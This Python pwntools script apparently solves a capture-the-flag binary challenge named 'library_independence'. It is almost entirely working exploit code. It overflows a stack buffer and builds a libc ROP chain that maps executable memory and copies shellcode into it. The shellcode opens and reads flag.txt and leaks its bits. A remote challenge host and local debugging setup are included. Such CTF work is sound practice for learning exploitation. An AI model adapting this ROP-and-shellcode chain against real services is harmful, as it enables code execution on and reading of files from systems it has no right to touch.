#!/usr/bin/env python3
from pwn import *
from pwnlib.rop.gadgets import Gadget
import ctypes
import base64
elf = ELF("./library_independence_binary_001")

def uint(x):
    return ctypes.c_uint64(x).value

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hb', '-F', '1', '-P']

def conn():
    proc = [
        './qemu-x86_64-static',
        '-L', './libs/1',
        elf.path
    ]
    if args.REMOTE:
        HOST = 'challenge.ctf.uscybergames.com'
        PORT = '56861'
        io = remote(HOST, PORT)
    elif args.GDB:
        io = process("./qemu-x86_64-static -d page -g 1234 -L ./libs/1 ./library_independence_binary_001".split())
        # io = process("./qemu-x86_64-static -g 1234 -L ./libs/1 ./library_independence_binary_001".split())
        gdbscript = """
            # brva 0x119b
            brva 0x11a2
            b * 0x2aaaab328e91
            c
        """
        # proc = [
        #     './qemu-x86_64-static',
        #     '-L', './libs/1',
        #     '-g', '12345',
        #     elf.path
        # ]
        gdb.attach(("localhost", 1234), exe='./library_independence_binary_001', gdbscript=gdbscript)
        # io = gdb.debug(proc, gdbscript=gdbscript)
        # # io = process(proc)
    else:
        # io = process("./qemu-x86_64-static -L ./libs/1 ./library_independence_binary_001".split())
        io = process(["./run.sh"])
    return io

libc = ELF('./libs/1/lib/x86_64-linux-gnu/libc.so.6')
elf.address = 0x0000555555556000
libc.address = 0x00002aaaab302000
vuln = elf.address + 0x1165

ROP_libc = ROP(libc)

pop_rdi: Gadget = ROP_libc.find_gadget(['pop rdi', 'ret'])
pop_rsi: Gadget = ROP_libc.find_gadget(['pop rsi', 'ret'])
pop_rax: Gadget = ROP_libc.find_gadget(['pop rax', 'ret'])
syscall: Gadget = ROP_libc.find_gadget(['syscall', 'ret'])
# 0x000000000010556d : pop rdx ; pop rcx ; pop rbx ; ret
pop_rdx_rcx_rbx = libc.address + 0x10556d
# 0x0000000000156108 : mov r8, rax ; mov rax, r8 ; pop rbx ; ret
clone_r8_rax = libc.address + 0x156108
# 0x0000000000049e00 : mov rax, r8 ; ret
mov_rax_r8 = libc.address + 0x49e00
# 0x00000000000c9ccf : xor r9d, r9d ; mov eax, r9d ; ret
clear_r9d_eax = libc.address + 0xc9ccf
# 0x0000000000141ee0 : xor r10d, r10d ; mov eax, r10d ; ret
xor_r10d_eax = libc.address + 0x141ee0
# 0x0000000000026e91 : jmp rax
jmp_rax = libc.address + 0x26e91
# 0x00000000001626d5 : pop rax ; pop rdx ; pop rbx ; ret
pop_rax_rdx_rbx = libc.address + 0x1626d5
# 0x00000000000abae8 : add rax, rdi ; ret
add_rax_rdi = libc.address + 0x00000000000abae8
# 0x0000000000045443 : push rsi ; ret
push_rsi = libc.address + 0x0000000000045443
# 0x0000000000037aa8 : mov rax, r12 ; pop r12 ; ret
mov_rax_r12_pop_r12 = libc.address + 0x0000000000037aa8
# 0x0000000000032b59 : pop r12 ; ret
pop_r12 = libc.address + 0x0000000000032b59
# 0x0000000000045197 : push rax ; ret
push_rax = libc.address + 0x0000000000045197

ADDR = 0x41410000
BASE = 0x00002aaaab2aa4c0 # address of read data
# ROP chain to call mmap(ADDR, 0x1000, 7, 34, -1, 0)

bits = []
# for i in range(64):
#     for j in range(8):
for i in range(1):
    for j in range(1):
        r = conn()
        shellcode = f'''
            mov rax, 2      
            lea rdi, [rip + filename]
            xor rsi, rsi  
            xor rdx, rdx
            syscall
            
            test rax, rax
            js exit_error     
            mov r12, rax    
            
            xor rax, rax  
            mov rdi, r12     
            lea rsi, [rip + buffer]
            mov rdx, 256     
            syscall
            
            mov r13, rax    
            mov rax, 3        
            mov rdi, r12
            syscall
            
            mov rcx, {i}
            mov rdx, {j}  
            
            lea rsi, [rip + buffer]
            mov al, [rsi + rcx] 
            
            mov cl, dl         
            shr al, cl          
            and al, 1       
            
            test al, al
            jz exit_success 
            
            mov rax, 1
            mov rdi, 1
            lea rsi, [rip + buffer]
            mov rdx, r13
            syscall
            
            jmp exit_success

        exit_success:
            mov rax, 60         
            xor rdi, rdi
            syscall

        exit_error:
            mov rax, 60         
            mov rdi, 1          
            syscall

        filename:
            .ascii "flag.txt"
            .byte 0

        buffer:
            .space 256
        '''
        shellcode = asm(shellcode, arch='amd64', os='linux')

        chain = [
            # store read addr for in r12
            push_rsi,
            pop_r12, 

            clear_r9d_eax,  # Clear r9d and set eax to 0
            pop_rdi, ADDR,  # Set rdi to ADDR (address for mmap)
            pop_rsi, 0x1000,  # Set rsi to 0x1000 (size for mmap)
            pop_rdx_rcx_rbx, 7, 34, 0,  # Set rdx to 7 (PROT_READ | PROT_WRITE | PROT_EXEC), rcx to 34 (MAP_PRIVATE | MAP_ANONYMOUS)
            pop_rax, uint(-1),
            clone_r8_rax, 0,  # Set r8 to -1 (fd for mmap)
            pop_rax, libc.symbols['mmap'],  # Set rax to the address of mmap
            jmp_rax,  # Call mmap

            # get base + x into rsi
            mov_rax_r12_pop_r12, 0,
            pop_rdi, 280,
            add_rax_rdi,
            push_rax, 
            pop_rsi, 
            pop_rdi, ADDR, # Set rdi to the address of the buffer
            pop_rax_rdx_rbx, libc.symbols['memcpy'], len(shellcode), 0, # Set rax to memcpy and rdx to length
            jmp_rax,  # Call memcpy

            ADDR
        ]
        # print(chain)

        chain = b''.join([
            p64(x.address) if type(x) == Gadget else p64(x) for x in chain
        ])

        print(len(chain))

        payload = b'A' * 56
        payload += chain
        # print(len(payload))
        payload += shellcode
        print(len(payload))

        r.send(payload)
        r.interactive()
        break

        payload = base64.b64encode(payload)
        r.sendlineafter(b':', payload)
        
        r.recvline_contains(b'[*] Running Step 1')
        nxt = r.recvline()
        print(i, j, nxt)
        if b'flag not found' in nxt:
            bits.append(0)
        else:
            bits.append(1)
        r.close()